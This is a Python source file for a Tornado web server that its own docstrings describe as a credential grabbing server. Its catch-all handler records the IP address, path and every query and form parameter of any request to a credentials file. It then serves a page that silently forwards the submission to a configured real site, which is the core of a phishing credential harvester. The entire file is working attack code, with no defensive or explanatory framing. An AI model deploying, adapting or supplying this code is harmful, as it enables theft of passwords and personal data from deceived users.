# -*- coding: utf-8 -*-
from __future__ import absolute_import
from tornado.web import RequestHandler, Application
from tornado.ioloop import IOLoop
import logging
from config import ConfigManager
from datetime import datetime

logger = logging.getLogger(__name__)
config = ConfigManager


class GrabberHandler(RequestHandler):
    """
    This request handler handles the retrieval and storage of credentials submitted to it.
    """

    _received_count = 0

    def __get_query_string_dict(self):
        """
        Get a dictionary containing the keys and values submitted via query string to self.request.
        :return: A dictionary containing the keys and values submitted via query string to self.request.
        """
        return self.request.query_arguments

    def __get_body_dict(self):
        """
        Get a dictionary containing the keys and values submitted via HTTP request body to self.request.
        :return: A dictionary containing the keys and values submitted via HTTP request body to self.request.
        """
        return self.request.body_arguments

    def __handle_request(self, *args, **kwargs):
        """
        Handle self.request in a method-agnostic way.
        :param args: Arguments.
        :param kwargs: Keyword arguments.
        :return: None
        """
        self.__write_request_contents(*args, **kwargs)
        self.__render_redirect_page()
        GrabberHandler._received_count += 1
        logger.debug(
            "Total requests processed count: %s."
            % (GrabberHandler._received_count,)
        )
    get = head = post = delete = patch = put = options = __handle_request

    def __render_redirect_page(self):
        """
        Render the page that will submit the submitted information to the redirect URL.
        :return: None
        """
        self.set_status(200)
        self.render("form.html")

    def __write_request_contents(self, *args, **kwargs):
        """
        Write all of the relevant contents of self.request to the file referenced by ConfigManager.CREDENTIALS_FILE_PATH.
        :return: None
        """
        lines = []
        lines.append("---- Request Received Start ----")
        lines.append("")
        lines.append("Time: %s" % (datetime.now(),))
        lines.append("Requesting IP Address: %s" % (self.request.remote_ip,))
        lines.append("Requested URL: %s" % (self.request.path,))
        lines.append("Requested method: %s" % (self.request.method,))
        lines.append("")
        lines.append("Arguments:")
        lines.append("")
        if args:
            for index, arg in enumerate(args):
                lines.append("(%s) %s" % (index, args))

        else:
            lines.append("No arguments supplied")
        lines.append("")
        lines.append("Keyword Arguments:")
        lines.append("")
        if kwargs:
            for k, v in kwargs.iteritems():
                lines.append("%s --> %s" % (k, v))
        else:
            lines.append("No keyword arguments supplied")
        lines.append("")
        lines.append("Parameters:")
        lines.append("")
        for k, v in self.__get_query_string_dict().iteritems():
            lines.append("%s --> %s (Query String)" % (k, v))
        for k, v in self.__get_body_dict().iteritems():
            lines.append("%s --> %s (Request Body)" % (k, v))
        lines.append("")
        lines.append("---- Request Received End ----")
        lines.append("")
        logger.debug(
            "Now writing results of request to file at %s."
            % (config.CREDENTIALS_FILE_PATH,)
        )
        with open(config.CREDENTIALS_FILE_PATH, "a+") as f:
            f.write("\n".join(lines))
        logger.debug(
            "File updated successfully."
        )

    def get_redirect_inputs(self):
        """
        Get a dictionary containing the keys and values that should be submitted to the redirection
        server.
        :return: A dictionary containing the keys and values that should be submitted to the redirection
        server.
        """
        return self.__get_body_dict()

    def get_redirect_query_string(self):
        """
        Get the query string that should be included in the redirect URL form submission.
        :return: The query string that should be included in the redirect URL form submission.
        """
        return self.request.query

    def get_redirect_url(self):
        """
        Get the URL that the form submission should redirect to.
        :return: The URL that the form submission should redirect to.
        """
        query = self.get_redirect_query_string()
        if query:
            return "%s?%s" % (config.REDIRECT_URL, query)
        else:
            return config.REDIRECT_URL

    @property
    def redirect_method(self):
        """
        Get the HTTP method (GET or POST) that should be used for redirection submission.
        :return: The HTTP method (GET or POST) that should be used for redirection submission.
        """
        return config.REDIRECT_METHOD

    @property
    def redirect_url(self):
        """
        Get the URL that the redirection form should submit to.
        :return: The URL that the redirection form should submit to.
        """
        return config.REDIRECT_URL

    @property
    def title(self):
        """
        Get the title for the redirection page.
        :return: The title for the redirection page.
        """
        return config.REDIRECT_TITLE


def create_app():
    """
    Create and return the Tornado application for grabbing credentials.
    :return: The Tornado application for grabbing credentials.
    """
    return Application(
        [
            (r"/.*", GrabberHandler),
        ],
        template_path="templates",
    )


def run_app(ip_address=None, port=None):
    """
    Create the Tornado application for grabbing credentials and run it on the specified IP
    address and port.
    :param ip_address: The IP address to bind the server to.
    :param port: The port to bind the server to.
    :return: None
    """
    logger.debug(
        "Now starting credential grabbing server on endpoint %s:%s."
        % (ip_address, port)
    )
    app = create_app()
    app.listen(port, address=ip_address)
    ioloop = IOLoop.current()
    try:
        ioloop.start()
    except KeyboardInterrupt:
        logger.debug("Keyboard interrupt received.")
        ioloop.stop()
    logger.debug(
        "Application on endpoint %s:%s stopped."
        % (ip_address, port)
    )
